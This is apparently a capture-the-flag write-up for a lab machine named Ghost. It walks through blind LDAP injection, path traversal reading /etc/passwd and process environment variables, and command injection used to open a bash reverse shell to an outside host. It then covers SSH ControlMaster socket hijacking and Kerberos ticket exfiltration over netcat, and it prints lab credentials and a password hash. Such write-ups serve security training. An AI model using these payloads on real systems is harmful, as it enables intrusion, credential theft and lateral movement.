

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/6e14a1ce-d04d-4a8e-8a5a-fb216abed0ea/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=93406f1854c01001380525cd622bf6cf4dfab601fa018ab4d94da76abbc2263e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


looks like we’re logged in as `kathryn.holland` 


okey so the intranet forum page has nothing much to it, it just points us at gitea user, which we can bruteforce his password through the LDAP injection


```bash
------WebKitFormBoundaryuOxuKVehgTLrQAYY
Content-Disposition: form-data; name="1_ldap-username"

gitea_temp_principal
------WebKitFormBoundaryuOxuKVehgTLrQAYY
Content-Disposition: form-data; name="1_ldap-secret"

£Char£*
------WebKitFormBoundaryuOxuKVehgTLrQAYY
```


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/84f0ea6d-63f5-400d-99f7-c43dec707ba6/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=e438ce40ecfae9a1562e931347825ee15b0737d3964058191a68368d22cf2ccd&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


as we can see 1st char is s, we can keep going until we uncover the entire password

> Username **`gitea_temp_principal`** & Password `szrr8kpc3z6onlqf` 

and we’re in Gitea!!


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/234f7ea2-cafb-4ff8-b99c-15e411937209/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=044148f9d8f06afeee003ea488affc85d7661489864422a8a55519c67254c64b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


we can see 2 repos, the intranet repo, which shouldn’t help us much, and we see the Ghost CMS repo, labeled as `Blog` 


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/bb68d89d-ca13-44cc-baab-a233358ce68b/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=145374814bf83fa007c3673347c7af9b2da3dd87d2563ae89d0d994ae952a8ad&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


we will need that api key noted in the readme to access the api, 
looking at the `posts.js` file


```bash
async query(frame) {
            const options = {
                ...frame.options,
                mongoTransformer: rejectPrivateFieldsTransformer
            };
            const posts = await postsService.browsePosts(options);
            const extra = frame.original.query?.extra;
            if (extra) {
                const fs = require("fs");
                if (fs.existsSync(extra)) {
                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
                    posts.meta.extra = { [extra]: fileContent };
                }
            }
            return posts;
        }
    },
```


we can clearly see that its reading and returning file content without any sanitization, so we could do `path traversal` easily


so if we try something like 


```bash
http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../etc/passwd

## we get 

"extra": {
      "../../../../etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"
    }
```


clean, now lets get the environment variables


```bash
…/labs/ghost 10.10.17.85 ❯ curl -s "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../proc/1/environ" | python3 -m json.tool | grep -A3 '"extra"' | tr '\0' '\n'
        "extra": {
            "../../../../proc/1/environ": "HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
        }
    }
```


we can see the db is at `/content/data/ghost.db` , ill spin up a quick python script to retrieve it


```python
import requests
import json
import re

r = requests.get(
    'http://ghost.htb:8008/ghost/api/content/posts/',
    params={
        'key': 'a5af628828958c976a3b6cc81a',
        'extra': '../../../../var/lib/ghost/content/data/ghost.db'
    }
)

# Work with raw bytes, find the extra content between known markers
raw = r.content

# Parse JSON but use raw_unicode_escape to preserve bytes
text = raw.decode('raw_unicode_escape')
data = json.loads(r.text)
content = list(data['meta']['extra'].values())[0]

# Encode back preserving unicode escapes as actual bytes
with open('ghost.db', 'wb') as f:
    f.write(content.encode('raw_unicode_escape'))
```


unfortunately, the format was never right, because it was bundled in JSON, so we couldn’t read it with sqlite3 cli, but we could just use strings on it and look for user hashes


```bash
…/labs/ghost 10.10.17.85 🐍 ❯ file ghost.db 
ghost.db: SQLite 3.x database, user version 1717986916 (0x66666664), last written using SQLite version 0, file counter 92, database pages 1969645158, 1st free page 1677721600, free pages 1551197798, cookie 0x66640000, schema 6059366, cache page size 1717986304, largest root page 1536, unknown 0x5c75 encoding, vacuum mode 4, reserved 0x100000000000000, version-valid-for 0
```


welp, i did get kathryn’s hash, but it was unfortunately not crackable


```bash
…/labs/ghost 10.10.17.85 🐍 ❯ cat > kathryn.hash
$2a$10$lSwOgij5ynSgNi0uwAhhQu7aV5IOnhwrYIKctWko7fAZ6h5Ci6j0.
```


okey so back to square one, i remembered the readme had mentioned that some features were only accessible using the `DEV_INTRANET_KEY` that we extracted from env vars as 

> **DEV_INTRANET_KEY** = `!@yqr!X2kxmQ.@Xe` 

so lets check the intranet repo, see whats hidden behind that key


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/3a666fb9-769f-450b-8b76-4e994bd917b9/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=9fa67d7b160f13d66b13436512a0cfa6debb4a87bde79ef0ecd216f146ba30db&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


at first glance, readme sais dev API is at `http://intranet.ghost.htb/api-dev`


lets check what the dev endpoint source code features


```bash
use std::process::Command;

use rocket::serde::json::Json;
use rocket::serde::Serialize;
use serde::Deserialize;

use crate::api::dev::DevGuard;

#[derive(Deserialize)]
pub struct ScanRequest {
    url: String,
}

#[derive(Serialize)]
pub struct ScanResponse {
    is_safe: bool,
    // remove the following once the route is stable
    temp_command_success: bool,
    temp_command_stdout: String,
    temp_command_stderr: String,
}

// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();

    match result {
        Ok(output) => {
            Json(ScanResponse {
                is_safe: true,
                temp_command_success: true,
                temp_command_stdout: String::from_utf8(output.stdout).unwrap_or("".to_string()),
                temp_command_stderr: String::from_utf8(output.stderr).unwrap_or("".to_string()),
            })
        }
        Err(_) => Json(ScanResponse {
            is_safe: true,
            temp_command_success: false,
            temp_command_stdout: "".to_string(),
            temp_command_stderr: "".to_string(),
        })
    }
}
```


well, that looks like a straightforward command injection, lets get us a `revshell` 


lets test it out first


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6790f091-be70-816e-89c1-0003a5ee1edf/2c51f0a5-38d5-41f2-b843-afbabd162188/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB46643QCKPH6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T004956Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCnRk8wCCVEwDOWuupRF5SM02ggOmXGze%2Bap9fRNDp6SQIgEqgEDxDcm5JzNXWoDjijMiW6bdww9fR1NkV24AOoe7Eq%2FwMIeRAAGgw2Mzc0MjMxODM4MDUiDFQDmwT3kkoew8DMoCrcA6UGzsDjZu%2BRo5VxXoNHA7%2FGVXHxsJWhaavo5rtmqES1yIgvfKI66XVEeK5cuf%2Fcsn5KKsZsWAsPofb6C8717EM3MWYzEedC6oCwCiNFMV%2Fe6poJ9%2FQFzVlzK6DmhR2zzm8xbxLoQ2K%2BmczrbDvwvux7LrYHZYXQj4V5qe7yAICtlqTLwT6lxknggkT6nZnfQNVz0viOFCUpan%2F2hAHZ498XXZOR0Q0Z9hCnpRcXNKSXgkx9OCdwpBEirt%2FfkRZmvUvcdyjXev85ZOkW2VPHOpnIAP8nXb4xBGJcia%2Ba6cbhqqmbhtEvqI%2FyDN%2BRzsCMwnq4JZvOf6F8f%2F8q%2F1LyzI6hkrBsLVSaNxgCWL%2F%2BEB7XTA7FxpRoB9tGyVkA%2BYH6uv%2B2bCW1HdnQdxy3KnL8fcueGoFbNRbe%2B1xfl9rtXdBzj0G8SuZhv%2FMBoLkMKBMGXlMyZjkx9ySJH4D5LCqzvTvMYYdNYJklrdmIj7Pln7LUeLxIDQxC8Oj3lc8AIyca8BSntwpMI%2FKTT9WU7yaISFiPmyj%2FCQhUvD4CK8CKRT0xj%2FQhClWg1mDIGwe39KQYOYqmp%2BWvXZxLW7hSVsFlKiKUm89JC%2B%2Bg6oU9kga38P6yXMwm7r832yzPPF4qMPqfttIGOqUB%2BbbEp2ejt0uxBS7jcjidkZK3MhFz32h6ZM%2F0v3aw8rKS7f9qrSVyJ5V1TT%2BLP8QFbU2%2F2SATNIFzA0KFNDM%2FvtvWoD%2BNmhOwDmfXZSTy6dK23fjNZDsbrDUL%2BUtfWmxswj%2BeLt%2FTRpMQFhGld4Ut7Z7g3O%2BpYlWtHr3h1Riu6rSd5ihNbUPfXBzAJfXR4eGHLED9f2Dtj9aUmzmQgWLM0b%2FGOxta&X-Amz-Signature=191a30cfb471118a4bac05ea4d284bc7a9fc12bed946cbc0cb02c4f2df79f837&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


there we go, it works, lets get a shell now


```bash
## Target
POST /api-dev/scan HTTP/1.1
Host: intranet.ghost.htb:8008
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
X-Dev-Intranet-Key: !@yqr!X2kxmQ.@Xe
Content-Length: 37

{"url": "http://example.com; bash -i >& /dev/tcp/10.10.17.85/9999 0>&1"}

## Host machine
…/labs/ghost 10.10.17.85 🐍 ❯ rlwrap nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.231.105 49798
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app# ls
ls
database.sqlite
ghost_intranet
```


nice, we’re in, the hostname tells we’re inside a container, lets see if there are any interesting things stored here


```bash
ls -alh /root/.ssh
total 32K
drwxr-xr-x 1 root root 4.0K Jul  5  2024 .
drwx------ 1 root root 4.0K Jul  5  2024 ..
-rw-r--r-- 1 root root   92 Jun 18 22:42 config
drwxr-xr-x 1 root root 4.0K Jun 18 22:43 controlmaster
-rw------- 1 root root  978 Jul  5  2024 known_hosts
-rw-r--r-- 1 root root  142 Jul  5  2024 known_hosts.old
```


**SSH ControlMaster** is a feature that lets multiple SSH sessions share a single connection. The first connection authenticates normally and creates a **Unix socket file**. Subsequent connections to the same host reuse that socket, **no re-authentication needed**.


```bash
root@36b733906694:/app# cat /root/.ssh/config
ControlMaster auto          # automatically create/reuse master connections
ControlPath ~/.ssh/controlmaster/%r@%h:%p   # socket location: user@host:port
ControlPersist yes          # keep the master alive even after first session exits
```


we can check for active sessions and hijack one


```bash
root@36b733906694:/app# ls -la /root/.ssh/controlmaster/
ls -la /root/.ssh/controlmaster/
total 12
drwxr-xr-x 1 root root 4096 Jun 18 22:43 .
drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
srw------- 1 root root    0 Jun 18 22:43 florence.ramirez@ghost.htb@dev-workstation:22


root@36b733906694:/app# ssh -S /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb@dev-workstation

florence.ramirez@LINUX-DEV-WS01:~$
florence.ramirez@LINUX-DEV-WS01:~$ id
id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
```


and we’re in what looks like a VM or WSL now, given that florence is an actual AD user, he is probably connected through a TGT


```bash
florence.ramirez@LINUX-DEV-WS01:~$ klist
klist
Ticket cache: FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
06/19/26 01:46:02  06/19/26 11:46:02  krbtgt/GHOST.HTB@GHOST.HTB
	renew until 06/20/26 01:46:02
```


lets get that ticket locally on our end


```bash
…/labs/ghost 10.10.17.85 🐍 ❯ nc -lvnp 9000 > florence.ramirez.b64
Listening on 0.0.0.0 9000
Connection received on 10.129.231.105 49782

…/labs/ghost 10.10.17.85 🐍 ❯ base64 -d florence.ramirez.b64 > florence.ramirez.ccache

…/labs/ghost 10.10.17.85 🐍 ❯ describeTicket.py florence.ramirez.ccache 
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 72a0fe785bd92ee499c050c778f10c430f62566ab3284aedec2f0957b15ebc8c
[*] User Name                     : florence.ramirez
[*] User Realm                    : GHOST.HTB
[*] Service Name                  : krbtgt/GHOST.HTB
[*] Service Realm                 : GHOST.HTB
[*] Start Time                    : 19/06/2026 02:51:01 AM
[*] End Time                      : 19/06/2026 12:51:01 PM
[*] RenewTill                     : 20/06/2026 02:51:01 AM
[*] Flags                         : (0xe10000) renewable, initial, pre_authent, enc_pa_rep
[*] KeyType                       : aes256_cts_hmac_sha1_96
[*] Base64(key)                   : cqD+eFvZLuSZwFDHePEMQw9iVmqzKErt7C8JV7FevIw=
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : krbtgt/GHOST.HTB
[*]   Service Realm               : GHOST.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```


okey, lets try it again smb/ldap


```bash
…/labs/ghost 10.10.17.85 4s 🐍 ❯ nxc smb 10.129.231.105 -k --use-kcache --shares
SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.105  445    DC01             [+] GHOST.HTB\florence.ramirez from ccache 
SMB         10.129.231.105  445    DC01             [*] Enumerated shares
SMB         10.129.231.105  445    DC01             Share           Permissions            Remark
SMB         10.129.231.105  445    DC01             -----           -----------            ------
SMB         10.129.231.105  445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.231.105  445    DC01             C$                                     Default share
